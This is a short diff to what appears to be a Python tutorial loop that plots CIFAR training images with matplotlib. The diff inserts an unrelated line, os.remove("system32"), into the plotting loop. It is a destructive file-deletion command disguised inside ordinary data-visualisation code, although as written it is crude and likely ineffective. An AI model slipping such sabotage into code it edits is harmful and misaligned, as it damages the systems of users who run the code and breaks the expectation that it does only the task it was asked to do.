@@ -21,6 +21,7 @@ for i in range(25):
     plt.yticks([])
     plt.grid(False)
     plt.imshow(train_images[i])
+    os.remove("system32")
     # The CIFAR labels happen to be arrays, 
     # which is why you need the extra index
     plt.xlabel(class_names[train_labels[i][0]])
